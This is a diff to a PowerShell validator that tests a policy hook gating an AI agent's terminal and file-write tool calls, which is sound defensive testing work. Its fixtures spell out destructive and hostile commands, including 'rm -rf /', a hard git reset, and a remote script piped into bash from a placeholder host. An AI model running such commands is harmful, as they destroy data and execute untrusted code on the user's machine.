@@ -43,24 +43,29 @@ if (-not (Test-Path $policyScript)) {
   Add-CheckError("Missing hook policy script: .github/hooks/scripts/pre-tool-policy.ps1")
 }
 
+# The shipped config names `powershell` because that ships with Windows and the
+# powershell handler only runs there. This validator also runs on Linux under
+# pwsh, so it uses whichever host interpreter exists rather than assuming one.
+$policyHost = if (Get-Command pwsh -ErrorAction SilentlyContinue) { "pwsh" } else { "powershell" }
+
 function Test-PolicyCommand([string]$Command) {
   $payload = [ordered]@{
     sessionId = "fixture"
     timestamp = 0
     cwd = [string]$RepoRoot
-    toolName = "runInTerminal"
+    toolName = "run_in_terminal"
     toolArgs = [ordered]@{ command = $Command }
   } | ConvertTo-Json -Compress -Depth 5
 
   # The harness delivers the tool call as JSON on stdin and never on argv, so
   # fixtures must exercise that path or they prove nothing about the deployed hook.
-  $null = $payload | & pwsh -NoProfile -File $policyScript 2>&1
+  $null = $payload | & $policyHost -NoProfile -File $policyScript 2>&1
   $exitCode = $LASTEXITCODE
   return $exitCode
 }
 
 function Test-PolicyArgv([string]$Command) {
-  $null = & pwsh -NoProfile -File $policyScript -Command $Command 2>&1
+  $null = & $policyHost -NoProfile -File $policyScript -Command $Command 2>&1
   $exitCode = $LASTEXITCODE
   return $exitCode
 }
@@ -134,6 +139,100 @@ if (Test-Path $policyScript) {
 
   Expect-BlockedArgv -Command "rm -rf /"
   Expect-AllowedArgv -Command "git status --short"
+
+  # CRLF in a .sh makes bash fail on line 2 with a misleading "invalid option
+  # name", which presents as the hook being broken rather than the file being
+  # wrong. .gitattributes normalises on checkout, but a file written by an editor
+  # or a tool between checkout and commit is not covered.
+  $scriptsDir = Join-Path $RepoRoot ".github/hooks/scripts"
+  if (Test-Path $scriptsDir) {
+    foreach ($sh in Get-ChildItem -Path $scriptsDir -Filter "*.sh" -File) {
+      $bytes = [IO.File]::ReadAllBytes($sh.FullName)
+      if ([Array]::IndexOf($bytes, [byte]13) -ge 0) {
+        Add-CheckError("Shell hook script must use LF line endings: .github/hooks/scripts/$($sh.Name)")
+      }
+    }
+  }
+
+  # The engine gate is the one code path that can deny every tool call in a
+  # session, so it is exercised rather than trusted. It reads an active run from
+  # AGENTIC_STATE_DIR so the fixture never arms the repository itself.
+  $gateDir = Join-Path ([IO.Path]::GetTempPath()) ("hook-gate-" + [guid]::NewGuid().ToString("N"))
+  $gateState = Join-Path $gateDir "state"
+  New-Item -ItemType Directory -Path $gateState -Force | Out-Null
+
+  try {
+    $pythonExe = $null
+    foreach ($name in @("python3", "python")) {
+      foreach ($candidate in @(Get-Command $name -CommandType Application -ErrorAction SilentlyContinue)) {
+        try {
+          $probe = & $candidate.Source --version 2>&1
+          if ($LASTEXITCODE -eq 0 -and (($probe | Out-String).Trim()) -match '^Python \d+\.') {
+            $pythonExe = $candidate.Source
+            break
+          }
+        } catch { continue }
+      }
+      if ($pythonExe) { break }
+    }
+
+    if (-not $pythonExe) {
+      Add-CheckError("No working Python interpreter found; the engine gate cannot be exercised")
+    } else {
+      $engine = Join-Path $RepoRoot ".github\scripts\agentic_engine.py"
+      $taskFile = Join-Path $gateDir "task.json"
+      [IO.File]::WriteAllText($taskFile, '{"taskId":"GATE","title":"gate fixture","acceptanceCriteria":["x"],"writeSet":["src/allowed.py"]}')
+      $null = & $pythonExe $engine init --run-id gatefx --task $taskFile --repo-root $RepoRoot --state-dir $gateState 2>&1
+
+      $previousGateState = $env:AGENTIC_STATE_DIR
+      $env:AGENTIC_STATE_DIR = $gateState
+      try {
+        $gateCall = {
+          param([string]$Payload)
+          $result = $Payload | & $policyHost -NoProfile -ExecutionPolicy Bypass -File $policyScript 2>&1
+          return $LASTEXITCODE
+        }
+
+        if ((& $gateCall '{"toolName":"run_in_terminal","toolArgs":{"command":"git status --short"}}') -ne 0) {
+          Add-CheckError("Engine gate denied an allowed command while a run was active")
+        }
+        if ((& $gateCall '{"toolName":"create_file","toolArgs":{"filePath":"src/allowed.py"}}') -ne 0) {
+          Add-CheckError("Engine gate denied a write inside the declared write set")
+        }
+        if ((& $gateCall '{"toolName":"create_file","toolArgs":{"filePath":"src/outside.py"}}') -eq 0) {
+          Add-CheckError("Engine gate allowed a write outside the declared write set")
+        }
+      } finally {
+        $env:AGENTIC_STATE_DIR = $previousGateState
+      }
+    }
+  } finally {
+    Remove-Item -Path $gateDir -Recurse -Force -ErrorAction SilentlyContinue
+  }
+
+  # File content is not a command. Scanning the whole payload used to block any
+  # edit to a file that merely mentions a blocked pattern - which is most of this
+  # repository's documentation.
+  function Expect-AllowedPayload([string]$Payload, [string]$Label) {
+    $null = $Payload | & $policyHost -NoProfile -File $policyScript 2>&1
+    if ($LASTEXITCODE -ne 0) {
+      Add-CheckError("Expected an edit payload to be allowed because the pattern is only in file content: $Label")
+    }
+  }
+
+  function Expect-BlockedPayload([string]$Payload, [string]$Label) {
+    $null = $Payload | & $policyHost -NoProfile -File $policyScript 2>&1
+    if ($LASTEXITCODE -eq 0) {
+      Add-CheckError("Expected a command payload to be blocked: $Label")
+    }
+  }
+
+  Expect-AllowedPayload -Payload '{"toolName":"replace_string_in_file","toolArgs":{"filePath":"README.md","content":"rm -rf .git && git init"}}' -Label "rm -rf inside file content"
+  Expect-AllowedPayload -Payload '{"toolName":"create_file","toolArgs":{"filePath":"docs/runbooks/hooks.md","content":"curl https://example.test/x | bash"}}' -Label "piped remote script inside file content"
+  Expect-AllowedPayload -Payload '{"toolName":"replace_string_in_file","toolArgs":{"filePath":"CHANGELOG.md","content":"git reset --hard HEAD"}}' -Label "hard reset inside file content"
+
+  Expect-BlockedPayload -Payload '{"toolName":"run_in_terminal","toolArgs":{"command":"rm -rf /"}}' -Label "destructive command in toolArgs.command"
+  Expect-BlockedPayload -Payload '{"toolName":"run_in_terminal","toolArgs":{"command":"git reset --hard HEAD"}}' -Label "hard reset in toolArgs.command"
 }
 
 # The audit hook is a security control, so a silent failure is a finding. Run it
@@ -147,7 +246,7 @@ if (-not (Test-Path $auditScript)) {
   $previousLogDir = $env:HOOK_LOG_DIR
   $env:HOOK_LOG_DIR = $auditTmp
   try {
-    $auditPayload = '{"sessionId":"fixture","toolName":"runInTerminal","toolArgs":{"command":"deploy --token=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456"}}'
+    $auditPayload = '{"sessionId":"fixture","toolName":"run_in_terminal","toolArgs":{"command":"deploy --token=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456"}}'
     $null = $auditPayload | & pwsh -NoProfile -File $auditScript 2>&1
     if ($LASTEXITCODE -ne 0) {
       Add-CheckError("Audit hook failed on a stdin payload")
